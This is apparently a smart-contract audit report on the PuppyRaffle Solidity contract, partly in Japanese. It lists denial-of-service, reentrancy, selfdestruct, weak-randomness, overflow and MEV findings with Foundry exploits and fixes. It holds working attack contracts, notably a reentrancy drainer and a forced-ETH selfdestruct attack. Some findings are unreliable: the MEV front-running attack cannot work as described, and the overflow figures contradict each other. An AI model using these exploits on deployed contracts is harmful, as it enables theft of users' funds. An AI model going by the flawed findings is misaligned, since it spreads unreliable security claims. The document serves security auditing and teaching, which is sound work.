### [H-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```solidity
// @audit DoS Attack
@> for (uint256 i = 0; i < players.length - 1; i++) {
@>     for (uint256 j = i + 1; j < players.length; j++) {
@>         require(players[i] != players[j], "PuppyRaffle: Duplicate player");
@>     }
@> }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6,540,000 gas
- 2nd 100 players: ~18,940,000 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place into following test into `PuppyRaffle.t.sol`

```Javascript
    function testDenialOfService() public {
        vm.txGasPrice(1);
        uint256 playerNum = 100;
        address[] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(uint160(i));
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players:", gasUsedFirst);

        //second 100players
        address[] memory playersTwo = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            playersTwo[i] = address(uint160(i + playerNum));
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

</details>

**Recommended Mitigation:** There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
     .
     .
     .
     function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        // rest of function
    }
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

---

### [M-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players, causing confusion with actual index 0 (**`slither, aderyn can't detect`**)

**Description:** The `getActivePlayerIndex` function returns 0 when a player is not found in the players array. However, 0 is also a valid array index for the first player. This creates ambiguity where callers cannot distinguish between "player not found" and "player is at index 0".

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;  // Valid index
        }
    }
    return 0;  // @audit Problem: Same value as valid index 0
}
```

**Impact:**

- Functions or external contracts relying on this function may incorrectly treat non-existent players as being at index 0
- This could lead to incorrect logic in player management or raffle operations
- Potential for unintended behavior in integrations that use this function

**Proof of Concept:**

```solidity
// Scenario: players = [0xAlice, 0xBob, 0xCharlie]
uint256 aliceIndex = puppyRaffle.getActivePlayerIndex(0xAlice);    // Returns 0 (correct)
uint256 eveIndex = puppyRaffle.getActivePlayerIndex(0xEve);        // Returns 0 (incorrect - Eve doesn't exist)
// Both return 0, but have completely different meanings
```

**Recommended Mitigation:** Consider one of the following approaches:

1. **Revert on not found:**

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}
```

2. **Return boolean + index:**

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

3. **Add separate existence check:**

```solidity
function isActivePlayer(address player) external view returns (bool) {
    return _isActivePlayer(player);
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    require(_isActivePlayer(player), "PuppyRaffle: Player not active");
    // existing loop logic
}
```

---

## [H-6] ETH Mishandling: selfdestruct強制送金攻撃による手数料システム破綻

### Description
PuppyRaffleの`withdrawFees()`関数は、コントラクト残高と内部手数料変数の厳密な等価性を前提とした脆弱な実装になっています。攻撃者は`selfdestruct`を利用してETHを強制的に送金することで、この等価性を破綻させ、プロトコルの手数料引き出し機能を永続的に無効化できます。

### Vulnerability Details

**脆弱なコード:**
```solidity
function withdrawFees() external {
    // @audit mishandling ETH - selfdestruct攻撃で会計システム破綻
    require(address(this).balance == uint256(totalFees), 
            "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

**攻撃の仕組み:**
1. 攻撃者が悪意のあるコントラクトをデプロイ
2. コンストラクタで`selfdestruct(puppyRaffleAddress)`を実行
3. 強制的にETHがPuppyRaffleに送金される
4. `address(this).balance > totalFees`となり会計システム破綻
5. `withdrawFees()`が永続的にrevertし続ける

### Impact
- **HIGH**: プロトコルの手数料が永続的に引き出し不能
- **経済的損失**: 蓄積された全手数料の永続ロック
- **ガバナンス破綻**: オーナーによる手数料管理機能の完全停止
- **攻撃コストの非対称性**: 1 ETHの攻撃で数百ETHの被害可能

### Proof of Concept

**攻撃コントラクト:**
```solidity
contract SelfDestructAttack {
    constructor(address target) payable {
        // PuppyRaffleに強制ETH送金
        selfdestruct(payable(target));
    }
}

// 攻撃の実行:
// new SelfDestructAttack{value: 1 ether}(address(puppyRaffle));
```

**攻撃後のテスト:**
```solidity
function testSelfDestructAttack() public {
    // 1. 正常なラッフル完了でtotalFeesを設定
    address[] memory players = new address[](4);
    // ... setup players ...
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();
    
    uint256 expectedFees = (entranceFee * 4 * 20) / 100;
    assertEq(puppyRaffle.totalFees(), expectedFees);
    
    // 2. ラッフル終了後、本来なら引き出し可能
    // Before Attack: address(this).balance == totalFees
    
    // 3. selfdestruct攻撃実行
    new SelfDestructAttack{value: 1 ether}(address(puppyRaffle));
    
    // After Attack: address(this).balance > totalFees
    assertTrue(address(puppyRaffle).balance > puppyRaffle.totalFees());
    
    // 4. withdrawFees()が永続的に失敗
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

### Tools Used
- **Manual Review**: selfdestruct攻撃パターンの分析
- **Static Analysis Results**: Slither・Aderynでは検出不可能
- **Foundry Testing**: 攻撃シナリオの実証

### Recommendations

**修正案1: 不等式チェック**
```solidity
function withdrawFees() external {
    // 厳密な等価ではなく最小残高をチェック
    require(address(this).balance >= uint256(totalFees), 
            "PuppyRaffle: Insufficient balance for fees");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

**修正案2: 内部会計システム**
```solidity
contract SecurePuppyRaffle {
    uint256 public activeRaffleBalance;
    uint256 public totalFees;
    
    function withdrawFees() external {
        // address(this).balanceに依存しない
        require(totalFees > 0, "No fees available");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "Failed to withdraw fees");
    }
}
```

**修正案3: Pull Paymentパターン**
```solidity
import "@openzeppelin/contracts/security/PullPayment.sol";

contract SecurePuppyRaffle is PullPayment {
    function selectWinner() external {
        // Push支払いではなくPull支払いで管理
        _asyncTransfer(feeAddress, fee);
    }
    
    function withdrawPayments(address payee) public override {
        super.withdrawPayments(payee);
    }
}
```

---

### [H-2] MEV vulnerability in `PuppyRaffle::refund` allows front-running attacks through observable playerIndex parameter (**`slither, aderyn can't detect`**)

**Description:** The `refund` function accepts a `playerIndex` parameter that is observable in the mempool before transaction execution. This creates an MEV (Maximum Extractable Value) opportunity where MEV bots can front-run legitimate refund transactions by copying the `playerIndex` value and attempting to claim the refund for themselves.

```solidity
function refund(uint256 playerIndex) public {
    // @audit MEV vulnerability - playerIndex is observable in mempool
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**

- MEV bots can monitor the mempool for refund transactions and attempt to front-run them
- Legitimate users may experience failed transactions due to front-running attempts
- Network congestion and increased gas costs due to MEV competition
- Poor user experience with unpredictable transaction success rates
- Economic exploitation of users through MEV extraction

**Attack Scenario:**

1. **User submits refund**: Alice calls `refund(5)` with gas price 20 gwei
2. **MEV bot detection**: Bot observes the transaction in mempool and sees `playerIndex = 5`
3. **Front-running attempt**: Bot submits `refund(5)` with higher gas price (25 gwei)
4. **Transaction ordering**: Bot's transaction executes first due to higher gas price
5. **User transaction fails**: Alice's transaction reverts with "Only the player can refund" since `players[5] != Alice` anymore

**Proof of Concept:**

```solidity
function testMEVFrontRunning() public {
    address[] memory players = new address[](2);
    players[0] = playerOne;
    players[1] = playerTwo;
    puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    
    address attacker = address(0x1337);
    
    // Simulate MEV bot observing playerIndex = 0 in mempool
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    
    // Attacker attempts to front-run with higher gas price
    vm.prank(attacker);
    vm.expectRevert("PuppyRaffle: Only the player can refund");
    puppyRaffle.refund(playerIndex);
    
    // Original user transaction would still succeed in this case
    // but demonstrates the observable nature of playerIndex
}
```

**Recommended Mitigation:** Remove the `playerIndex` parameter and derive it internally:

```solidity
function refund() public {
    uint256 playerIndex = _getPlayerIndex(msg.sender);
    require(playerIndex != type(uint256).max, "PuppyRaffle: Player not found");
    
    address playerAddress = players[playerIndex];
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

function _getPlayerIndex(address player) internal view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Not found
}
```

This mitigation:
- Eliminates observable parameters from the transaction
- Prevents MEV bots from extracting the player index from mempool observation
- Maintains the same functionality while removing the front-running vulnerability
- Uses `type(uint256).max` as a clear "not found" indicator instead of 0

---

### [H-3] Reentrancy vulnerability in `PuppyRaffle::refund` allows attackers to drain the contract (**`slither detects, but not well documented`**)

**Description:** The `refund` function violates the CEI (Checks-Effects-Interactions) pattern by making an external call (`sendValue`) before updating the contract state (`players[playerIndex] = address(0)`). This allows an attacker to re-enter the function and drain all funds from the contract.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    // @audit reentrancy - external call before state update
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0); // ← State update happens AFTER external call
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**

- Complete drainage of the contract's funds
- Financial loss for all legitimate participants
- Potential loss of NFT prizes as the contract becomes insolvent
- Reputational damage to the protocol

**Attack Scenario:**

1. **Setup**: Attacker deploys a malicious contract and enters the raffle
2. **Initial refund**: Attacker calls `refund()` to trigger the attack
3. **Reentrancy**: When `sendValue()` executes, it triggers the attacker's `receive()` function
4. **State exploitation**: `players[attackerIndex]` is still valid, allowing another `refund()` call
5. **Recursive drain**: Attack continues until contract balance is insufficient
6. **Complete theft**: Attacker steals entrance fees from all participants

**Proof of Concept:**

```solidity
contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }
}

function testReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
    console.log("starting puppy raffle balance:", startingPuppyRaffleBalance);
    
    // Execute reentrancy attack
    attackerContract.attack{value: entranceFee}();
    
    uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
    console.log("ending puppy raffle balance:", endingPuppyRaffleBalance);
    
    // Contract should be drained
    assert(endingPuppyRaffleBalance < startingPuppyRaffleBalance);
}
```

**Recommended Mitigation:** Follow the CEI pattern by updating state before external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Effects: Update state first
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    
    // Interactions: External call last
    payable(msg.sender).sendValue(entranceFee);
}
```

**Alternative mitigation** using OpenZeppelin's ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        // existing logic
    }
}
```

This vulnerability demonstrates why the CEI pattern is fundamental to secure smart contract development and why external calls should always be treated with extreme caution.

---

### [H-4] Weak randomness in `PuppyRaffle::selectWinner` allows attackers to predict and manipulate lottery outcomes (**`slither, aderyn detect`**)

**Description:** The `selectWinner` function uses predictable blockchain values (`msg.sender`, `block.timestamp`, `block.difficulty`) to generate randomness for winner selection. Even after EIP-4399 (The Merge), which replaced `block.difficulty` with `PREVRANDAO`, this implementation remains vulnerable to manipulation by validators and front-running attacks.

```solidity
function selectWinner() external {
    // @audit randomness - predictable values used for winner selection
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(
        msg.sender,           // Predictable (transaction sender)
        block.timestamp,      // Manipulable by validators (±15 seconds)
        block.difficulty      // Now PREVRANDAO, partially predictable
    ))) % players.length;
    
    address winner = players[winnerIndex];
    // Prize distribution follows...
}
```

**Impact:**

- Validators can manipulate `block.timestamp` within a 15-second window to influence outcomes
- Attackers can predict winners using known blockchain values before transaction execution
- MEV bots can front-run favorable outcomes or delay unfavorable ones
- Complete compromise of lottery fairness and user trust
- Economic loss for legitimate participants who never have a fair chance to win

**EIP-4399 Context:**

After Ethereum's transition to Proof of Stake (The Merge, September 2022), `block.difficulty` now returns the `PREVRANDAO` value from the beacon chain. While this improves randomness compared to PoW difficulty, it still has limitations:

- **Validator influence**: Each block proposer has 1-bit of influence per slot
- **Predictability**: Validators know PREVRANDAO values 1-2 slots in advance
- **Censorship attacks**: Unfavorable transactions can be delayed to the next block

**Attack Scenarios:**

**1. Validator Timestamp Manipulation:**

```solidity
contract ValidatorAttack {
    function predictAndWin() external {
        uint256 currentTime = block.timestamp;
        uint256 currentRandom = block.difficulty; // PREVRANDAO
        
        // Try different timestamps within 15-second window
        for (uint256 offset = 0; offset <= 15; offset++) {
            uint256 futureTime = currentTime + offset;
            uint256 predictedWinner = uint256(keccak256(abi.encodePacked(
                address(this), futureTime, currentRandom
            ))) % players.length;
            
            if (players[predictedWinner] == address(this)) {
                // Propose block with manipulated timestamp
                return;
            }
        }
    }
}
```

**2. Front-running Attack:**

```solidity
contract FrontRunAttack {
    function monitorAndAttack() external {
        // Monitor mempool for selectWinner() transactions
        uint256 predictedWinner = uint256(keccak256(abi.encodePacked(
            tx.origin,          // Observable in mempool
            block.timestamp,    // Current block
            block.difficulty    // Current PREVRANDAO
        ))) % players.length;
        
        if (players[predictedWinner] != address(this)) {
            // Submit high-gas transaction to delay to next block
            // where outcome might be more favorable
        }
    }
}
```

**Proof of Concept:**

```solidity
function testWeakRandomness() public {
    address[] memory players = new address[](10);
    for (uint256 i = 0; i < 10; i++) {
        players[i] = address(uint160(i + 1));
    }
    puppyRaffle.enterRaffle{value: entranceFee * 10}(players);
    
    // Attacker can predict the winner before calling selectWinner
    uint256 predictedWinner = uint256(keccak256(abi.encodePacked(
        address(this),      // Known msg.sender
        block.timestamp,    // Known current timestamp
        block.difficulty    // Known current PREVRANDAO
    ))) % players.length;
    
    console.log("Predicted winner index:", predictedWinner);
    console.log("Predicted winner address:", players[predictedWinner]);
    
    // Fast forward past raffle duration
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    
    // Select winner - result is predictable
    puppyRaffle.selectWinner();
    
    // Winner matches prediction
    address actualWinner = puppyRaffle.previousWinner();
    assertEq(actualWinner, players[predictedWinner]);
}
```

**Historical Attack Examples:**

- **$FFIST Token (2022)**: $110,000 loss due to predictable randomness exploitation
- **Various lottery contracts**: Multiple instances of validators manipulating outcomes
- **NFT minting contracts**: Attackers securing rare traits through randomness prediction

**Recommended Mitigation:**

**1. Chainlink VRF Implementation (Recommended):**

```solidity
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";

contract SecurePuppyRaffle is VRFConsumerBaseV2 {
    VRFCoordinatorV2Interface COORDINATOR;
    uint64 s_subscriptionId;
    bytes32 keyHash = 0x79d3d8832d904592c0bf9818b621522c988bb8b0c05cdc3b15aea1b6e8db0c15;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    uint32 numWords = 1;
    
    mapping(uint256 => bool) public s_requests;
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
        require(players.length >= 4, "Need at least 4 players");
        
        uint256 requestId = COORDINATOR.requestRandomWords(
            keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            numWords
        );
        s_requests[requestId] = true;
    }
    
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        require(s_requests[requestId], "Request not found");
        
        uint256 winnerIndex = randomWords[0] % players.length;
        address winner = players[winnerIndex];
        
        // Safe winner selection and prize distribution
        _distributePrizes(winner);
    }
}
```

**2. Commit-Reveal Scheme:**

```solidity
contract CommitRevealRaffle {
    mapping(address => bytes32) public commitments;
    mapping(address => uint256) public reveals;
    uint256 public commitPhaseEnd;
    uint256 public revealPhaseEnd;
    
    function commitRandomness(bytes32 commitment) external {
        require(block.timestamp < commitPhaseEnd, "Commit phase ended");
        require(isActivePlayer(msg.sender), "Not a player");
        commitments[msg.sender] = commitment;
    }
    
    function revealRandomness(uint256 nonce) external {
        require(block.timestamp < revealPhaseEnd, "Reveal phase ended");
        require(block.timestamp >= commitPhaseEnd, "Still in commit phase");
        
        bytes32 hash = keccak256(abi.encodePacked(msg.sender, nonce));
        require(hash == commitments[msg.sender], "Invalid reveal");
        
        reveals[msg.sender] = nonce;
    }
    
    function selectWinner() external {
        require(block.timestamp >= revealPhaseEnd, "Reveal phase not ended");
        
        uint256 combinedRandomness = 0;
        uint256 revealCount = 0;
        
        for (uint256 i = 0; i < players.length; i++) {
            if (reveals[players[i]] != 0) {
                combinedRandomness ^= reveals[players[i]];
                revealCount++;
            }
        }
        
        require(revealCount >= players.length / 2, "Insufficient reveals");
        uint256 winnerIndex = combinedRandomness % players.length;
        _distributePrizes(players[winnerIndex]);
    }
}
```

**3. Future Block Hash (Limited Security):**

```solidity
function selectWinnerDelayed() external returns (uint256 requestId) {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    
    requestId = uint256(keccak256(abi.encodePacked(block.timestamp, players.length)));
    pendingDraws[requestId] = PendingDraw({
        targetBlock: block.number + 10,
        playersSnapshot: players,
        executed: false
    });
    
    return requestId;
}

function executeDraw(uint256 requestId) external {
    PendingDraw storage draw = pendingDraws[requestId];
    require(block.number >= draw.targetBlock, "Too early");
    require(!draw.executed, "Already executed");
    
    bytes32 futureHash = blockhash(draw.targetBlock);
    require(futureHash != 0, "Block hash unavailable");
    
    uint256 winnerIndex = uint256(futureHash) % draw.playersSnapshot.length;
    draw.executed = true;
    
    _distributePrizes(draw.playersSnapshot[winnerIndex]);
}
```

**Note:** Chainlink VRF is the gold standard for secure randomness in production environments, providing cryptographically secure and verifiable random numbers that cannot be manipulated by any party.

---

### [H-5] Integer overflow in `PuppyRaffle::selectWinner` due to uint64 casting allows fee manipulation (**`slither, aderyn can't detect`**)

**Description:** The `selectWinner` function casts the calculated fee to `uint64` before adding it to `totalFees`. Since `uint64` has a maximum value of 18,446,744,073,709,551,615 (approximately 18.4 ETH), any fee amount exceeding this limit will overflow and wrap around to a much smaller value, resulting in incorrect fee accounting.

```solidity
function selectWinner() external {
    // ... winner selection logic ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // @audit overflow - uint64 casting can cause integer overflow
    totalFees = totalFees + uint64(fee);  // Vulnerable line
    // ... rest of function ...
}
```

**Impact:**

- **Fee manipulation**: Large raffle fees (>18.4 ETH) will overflow and become much smaller values
- **Financial loss**: Protocol loses fee revenue due to incorrect accounting
- **Inconsistent state**: `totalFees` will not accurately reflect actual fees collected
- **Withdrawal failures**: `withdrawFees()` may fail due to balance mismatches
- **Economic exploitation**: Attackers can deliberately trigger overflows to reduce fees

**Technical Details:**

**uint64 Maximum Values:**
- **Maximum uint64**: 18,446,744,073,709,551,615 wei
- **In ETH**: ~18.44 ETH
- **Overflow threshold**: Any fee ≥ 18.45 ETH will overflow

**Overflow Behavior:**
```solidity
// Example with 20 ETH fee (exceeds uint64 max)
uint256 fee = 20 ether;  // 20,000,000,000,000,000,000 wei
uint64 castedFee = uint64(fee);  // Overflows to 1,553,255,926,290,448,384 wei (~1.55 ETH)

// Result: Only ~1.55 ETH recorded instead of 20 ETH
totalFees += castedFee;  // Incorrect accounting
```

**Attack Scenario:**

1. **Setup large raffle**: Attacker organizes raffle with >920 participants at 1 ETH entrance fee
2. **Trigger overflow**: Total fee would be 184 ETH × 20% = 36.8 ETH (exceeds uint64 max)
3. **Fee reduction**: Due to overflow, only ~0.17 ETH is recorded as fees
4. **Economic benefit**: Protocol loses 36.63 ETH in fee revenue

**Proof of Concept:**

**Test 1: Basic overflow demonstration (testOverflow):**
```bash
forge test --match-test testOverflow -vvv

=== Demonstrating uint64 Casting Overflow ===
uint64 maximum value: 18446744073709551615
uint64 max in ETH: 18
Original value 200 ETH: 200000000000000000000
After uint64 cast: 15532559262904483840
Fee loss due to uint64 cast: 184467440737095516160
=== Vulnerability Confirmed: uint64 casting causes value truncation ===
```

**Test 2: Real-world scenario (testTotalFeesOverflow):**
```bash
forge test --match-test testTotalFeesOverflow -vvv

Starting total fees after first raffle: 800000000000000000  (0.8 ETH)
Expected new fee from 95 players: 19000000000000000000  (19 ETH) 
Expected total fees: 19800000000000000000  (19.8 ETH)
New fee before uint64 cast: 19000000000000000000  (19 ETH)
New fee after uint64 cast: 553255926290448384  (0.553 ETH)
Fee loss due to uint64 cast: 18446744073709551616  (18.446 ETH)
Actual ending total fees: 1353255926290448384  (1.353 ETH)
=== Real-world overflow scenario confirmed ===
```

**Critical findings:**
- **Theoretical test**: 200 ETH → 15.53 ETH (92.2% loss)
- **Real scenario**: 19.8 ETH expected → 1.353 ETH actual (93.2% loss) 
- **Cumulative damage**: Fees decrease instead of increase after multiple raffles
- **System corruption**: withdrawFees() fails due to balance mismatch
- **Silent vulnerability**: No revert occurs, making detection difficult

```solidity
function testIntegerOverflow() public {
    // Setup: Create raffle with high total value to trigger overflow
    uint256 participantCount = 1000;  // 1000 participants
    address[] memory players = new address[](participantCount);
    
    for (uint256 i = 0; i < participantCount; i++) {
        players[i] = address(uint160(i + 1));
        vm.deal(players[i], 1 ether);
    }
    
    // Each participant enters with 1 ETH (entrance fee)
    // Total collected: 1000 ETH
    // Expected fee (20%): 200 ETH
    // uint64 max: ~18.44 ETH
    // Overflow will occur: 200 ETH > 18.44 ETH
    
    uint256 initialTotalFees = puppyRaffle.totalFees();
    
    vm.startPrank(players[0]);
    puppyRaffle.enterRaffle{value: entranceFee * participantCount}(players);
    vm.stopPrank();
    
    // Fast forward past raffle duration
    vm.warp(block.timestamp + duration + 1);
    
    // Select winner - this will trigger the overflow
    puppyRaffle.selectWinner();
    
    uint256 finalTotalFees = puppyRaffle.totalFees();
    uint256 expectedFee = (participantCount * entranceFee * 20) / 100;  // 200 ETH
    uint256 actualFeeIncrease = finalTotalFees - initialTotalFees;
    
    console.log("Expected fee:", expectedFee);
    console.log("Actual fee recorded:", actualFeeIncrease);
    console.log("Fee loss due to overflow:", expectedFee - actualFeeIncrease);
    
    // Demonstrate that the actual fee is much smaller due to overflow
    assertLt(actualFeeIncrease, expectedFee);
    
    // The overflow causes ~18.4 ETH to wrap around
    uint256 overflowAmount = expectedFee % (type(uint64).max + 1);
    assertEq(actualFeeIncrease, overflowAmount);
}
```

**Why Static Analysis Tools Miss This:**

1. **Solidity 0.8+ overflow protection**: Automatic revert on overflow masks the issue during static analysis
2. **Type casting complexity**: Tools don't analyze the semantic meaning of downcasting large values
3. **Context-dependent vulnerability**: Requires understanding of business logic and value ranges
4. **No runtime execution**: Static analysis can't predict actual fee values that would trigger overflow

**Recommended Mitigation:**

**1. Remove unnecessary casting (Recommended):**

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // Fix: Remove uint64 casting
    totalFees = totalFees + fee;  // Direct uint256 addition
    
    // ... rest of function
}
```

**2. Add overflow protection:**

```solidity
function selectWinner() external {
    // ... existing logic ...
    
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // Check for uint64 overflow before casting
    require(fee <= type(uint64).max, "PuppyRaffle: Fee exceeds uint64 maximum");
    totalFees = totalFees + uint64(fee);
    
    // ... rest of function
}
```

**3. Change totalFees type to uint256:**

```solidity
// In state variables section
uint256 public totalFees = 0;  // Change from uint64 to uint256

function selectWinner() external {
    // ... existing logic ...
    totalFees = totalFees + fee;  // No casting needed
    // ... rest of function
}
```

This vulnerability demonstrates the importance of careful type management and the limitations of static analysis tools in detecting business logic vulnerabilities that depend on runtime values and type semantics.
